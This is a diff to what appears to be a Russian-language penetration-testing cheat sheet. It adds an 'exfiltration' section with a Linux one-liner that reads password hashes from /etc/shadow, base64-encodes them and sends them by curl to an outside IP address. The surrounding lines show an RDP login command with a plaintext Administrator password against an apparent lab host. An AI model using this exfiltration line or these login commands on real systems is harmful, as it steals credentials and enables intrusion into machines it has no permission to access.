@@ -273,6 +273,14 @@ rdp_check <domain>/<name>:<password>@<IP>
 xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.186.81 /u:'Administrator' /p:'Password321'
 ```
 
+## Эксфильтрафия 
+
+Linux
+
+```
+sudo grep '\$' /etc/shadow | base64 | tr -d '\n' |xargs -I @ curl http://172.16.72.1/hash/@
+
+```
 ## Настройка Kali
 
 ```
